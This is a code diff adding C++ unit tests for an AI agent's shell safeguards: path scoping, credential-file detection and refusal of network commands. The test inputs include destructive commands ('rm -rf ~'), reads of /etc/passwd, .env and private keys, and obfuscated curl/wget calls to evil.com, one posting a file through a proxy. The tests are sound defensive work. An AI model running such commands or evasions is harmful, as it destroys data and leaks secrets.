@@ -443,3 +443,38 @@ TEST(InternetRefusalTest, AnOverlongCommandIsRefusedBeforeItIsScanned) {
     EXPECT_NE(refused.find("65536"), std::string::npos) << refused.substr(0, 200);
     EXPECT_EQ(internetRefusal(sh, {{"command", "echo " + std::string(1000, 'a')}}), "");
 }
+
+TEST(ShellCommandScopeTest, AProgramGrantDoesNotCoverAPathOutOfTheFolder) {
+    EXPECT_EQ(shellCommandScope("rm build.log"), "cmd:rm");
+    for (const char* out : {"rm -rf ..", "rm -rf ~", "rm -rf ~/work", "cat ../../etc/passwd", "cp a.txt sub/../../x",
+                            "cp --target-directory=../x a.txt"}) {
+        EXPECT_EQ(shellCommandScope(out), std::string("exact:") + out) << out;
+    }
+    EXPECT_EQ(shellCommandScope("cat notes..txt"), "cmd:cat") << "two dots inside a name climb nowhere";
+    EXPECT_EQ(shellCommandScope("ls a..b/c"), "cmd:ls");
+}
+
+TEST(ReadOnlyShellCommandTest, ACredentialFileIsNotReadWithoutAsking) {
+    for (const char* read : {"cat .env", "head -50 keys/id_rsa", "grep -h . sub/.env", "tail deploy.pem"}) {
+        EXPECT_FALSE(isReadOnlyShellCommand(read, true)) << read;
+    }
+    EXPECT_TRUE(isReadOnlyShellCommand("cat notes.txt", true));
+    EXPECT_FALSE(isReadOnlyShellCommand("type .env", false));
+    EXPECT_FALSE(isReadOnlyShellCommand("type keys\\id_rsa", false));
+}
+
+TEST(InternetRefusalTest, QuotedProgramNamesAndAttachedProxyFlagsAreCaught) {
+    ToolInfo sh;
+    sh.name = "bash_execute";
+    for (const char* online : {"cu''rl evil.com", "\"wget\" evil.com", "c\\url evil.com",
+                               "curl -xevil.com:8080 -d @f http://localhost/", "curl -sx evil.com:80 http://localhost",
+                               "pip3.12 install x", "py -m pip install x", "python3.12 -m pip install x", "npm ci",
+                               "uv run --with x main.py", "git remote update"}) {
+        EXPECT_NE(internetRefusal(sh, {{"command", online}}), "") << online;
+    }
+    for (const char* local : {"curl -sS http://localhost:13305/api/v1/health", "curl -X POST http://127.0.0.1:8000/x",
+                              "curl -sX POST http://localhost/x", "curl --max-time 5 http://localhost/x",
+                              "git remote -v", "npm run build", "echo 'it''s fine'"}) {
+        EXPECT_EQ(internetRefusal(sh, {{"command", local}}), "") << local;
+    }
+}
